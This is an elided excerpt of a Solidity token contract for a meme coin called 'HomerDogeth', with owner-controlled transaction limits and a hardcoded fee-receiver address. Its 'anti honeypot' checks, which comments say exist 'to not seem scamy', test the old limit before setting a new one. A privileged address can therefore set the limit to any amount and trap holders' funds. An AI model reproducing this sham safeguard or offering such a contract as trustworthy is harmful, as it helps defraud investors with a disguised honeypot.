...
//WEBSITE BELOW! with Socials and Utility
//https://homerdogeth.net/
...
contract HomerDogeth is Ownable, ERC20 {
    ...
    string constant _name = "HomerDogeth";
    string constant _symbol = "$H";
...
//Get Ready Phase
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0x5Ed9CE26fb27b079DF516C3134928174e4bbe908;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        ...
        require(_maxWalletToken >= _totalSupply / 4000); //no less than .1% to not seem scamy
    ...
    function SetMaxTxPercent(uint256 maxTXPercent) public {
        require(isliveed[msg.sender]);
        require(_maxTxAmount >= _totalSupply / 4000); //anti honeypot no less than .1% to not seem scamy
        _maxTxAmount = (_totalSupply * maxTXPercent ) / 2000;
    }

    
    function setTxLimitAbsolute(uint256 amount) external onlyOwner {
        require(_maxTxAmount >= _totalSupply / 4000);
        _maxTxAmount = amount;
    }
